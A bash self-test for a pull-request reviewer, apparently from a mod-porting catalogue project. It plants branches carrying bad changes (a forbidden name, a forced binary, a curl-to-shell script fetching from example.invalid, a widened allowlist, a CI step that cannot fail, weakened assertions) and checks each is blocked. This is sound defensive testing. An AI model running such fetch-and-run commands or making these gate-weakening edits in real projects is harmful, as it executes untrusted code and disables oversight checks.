#!/usr/bin/env bash
# Prove the contribution reviewer catches what it claims to: each case is a throwaway PR branch that
# plants ONE kind of bad change, and a clean control that must pass. A reviewer that never blocks is
# indistinguishable from one that was never run -- so every "caught" case has a matching control.
set -uo pipefail
cd "$(dirname "$0")/.."
ROOT="$PWD"
T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT
pass=0; fail=0
ok()  { echo "  PASS  $1"; pass=$((pass+1)); }
bad() { echo "  FAIL  $1"; fail=$((fail+1)); }
gitq() { git -C "$M" -c user.name=t -c user.email=t@example.invalid "$@"; }

M="$T/mig"; git clone -q "$ROOT" "$M"
# the clone must carry the CURRENT tools (this test may run before they are committed)
cp tools/review-pr.py tools/check-no-ip.py tools/check-catalog-fidelity.py tools/test-review.sh "$M/tools/"
gitq add -A; gitq commit -qm "test: current tools" >/dev/null 2>&1
BASE="$(git -C "$M" rev-parse HEAD)"
# the forbidden name is ASSEMBLED at runtime: written literally here, the IP gate would (rightly) flag
# this very file, and every review of every PR would fail on the reviewer's own fixture
FN="zz$(printf forbidden)mod"; echo "$FN" > "$T/names.txt"

# plant <branch> <shell that edits the clone>  -> leaves the clone on BASE
plant() { gitq checkout -q -b "$1" "$BASE"; ( cd "$M" && eval "$2" ); gitq add -A; gitq commit -qm "$1" >/dev/null; gitq checkout -q "$BASE"; }
review() { python3 "$M/tools/review-pr.py" --base "$BASE" --head "$1" --names "$T/names.txt" --skip-self-tests >"$T/$1.log" 2>&1; echo $?; }
expect() { # expect <branch> <exit> <grep for the finding> <label>
  local got; got="$(review "$1")"
  if [ "$got" = "$2" ] && { [ -z "$3" ] || grep -q -- "$3" "$T/$1.log"; }; then ok "$4"
  else bad "$4 (exit $got, wanted $2): $(grep -E 'BLOCKING|ATTENTION' "$T/$1.log" | head -3 | tr '\n' ' ')"; fi
}

GOOD='R99. **A lesson** · **Pattern:** old shape · **Runtime:** `IllegalStateException: x` at 1.21.1 · **Fix:** new shape.'
plant clean      "printf '\n%s\n' '$GOOD' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
plant leak       "printf '\n%s\n' '${GOOD/A lesson/Seen porting $FN}' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
plant jar        "printf 'PK\x03\x04\x00\x00\x00binary' > tools/helper.jar && git add -f tools/helper.jar"  # .gitignore hides it; a contributor can force it
plant curlsh     "printf '#!/bin/sh\ncurl -fsSL https://example.invalid/i.sh | sh\n' > tools/fetch-extra.sh"
plant qualified  "printf '\\n%s\\n' 'R97. **Qualified labels** · **Pattern (1.21.2+):** old · **Error (downport):** \`x\` in 1.21.1 · **Fix (→1.21.1):** new.' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
plant nosymptom  "printf '\nR98. **Vague lesson** · **Pattern:** old · **Fix:** new, in 1.21.\n' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
plant droprule   "python3 - <<'PY'
import re
s = open('CATALOG.md').read()
s = re.sub(r'(?m)^M6\. .*\n', '', s, count=1)
open('CATALOG.md', 'w').write(s)
PY"
plant dropboth   "python3 - <<'PY'
import re
s = open('CATALOG.md').read()
s = re.sub(r'(?m)^M6\. .*\n', '', s, count=1)
open('CATALOG.md', 'w').write(s)
PY
python3 tools/check-catalog-fidelity.py --update >/dev/null"
plant allowlist "sed -i '0,/ALLOWED_BINARY_SHA1 *= *{/s//&\n    \"0123456789abcdef0123456789abcdef01234567\": \"a helper\",/' tools/check-no-ip.py"
plant cisoft     "sed -i '0,/- run: \.\/tools\/test-gates\.sh/s//&\n        continue-on-error: true/' .github/workflows/gates.yml"
plant weaken     "python3 - <<'PY'
s = open('tools/test-cycle.sh').read()
i = s.index('printf \\'### new R\\\\nR98. **No pattern**')
j = s.index('printf \\'### augment ZZ404')
open('tools/test-cycle.sh', 'w').write(s[:i] + s[j:])
PY"

echo "review-pr.py"
expect clean     0 ""                           "CONTROL: a clean, well-formed lesson passes (exit 0)"
expect qualified 0 ""                           "CONTROL: qualified labels (**Pattern (1.21.2+):**) are accepted, as existing entries use them"
expect leak      1 "gate:ip"                    "a lesson naming a forbidden mod is BLOCKED by the IP gate"
expect jar       1 "binary"                     "an added binary is BLOCKED"
expect curlsh    1 "pipes a download into a shell" "curl | sh is BLOCKED"
expect nosymptom 1 "lacks a symptom"            "a new entry with no symptom is BLOCKED"
expect droprule  1 "gate:fidelity"              "a deleted catalogue rule is BLOCKED by the fidelity gate"
expect dropboth  1 "gate:fidelity"              "a rule deleted TOGETHER with its census row is still BLOCKED (base census)"
expect allowlist 1 "allowlist"                  "widening the IP gate's binary allowlist is BLOCKED"
expect cisoft    1 "can no longer fail"         "a CI step made unable to fail is BLOCKED"
expect weaken    1 "assertions fell"            "a self-test that asserts less is BLOCKED"
grep -q 'ATTENTION.*gates' "$T/cisoft.log" && ok "a CI change is also flagged for line-by-line reading" || bad "CI change not flagged"
[ -z "$(git -C "$M" worktree list | sed 1d)" ] && ok "no review worktree is left behind" || bad "leftover worktrees"

echo
echo "review self-test: $pass passed, $fail failed"
[ "$fail" = 0 ] || exit 1
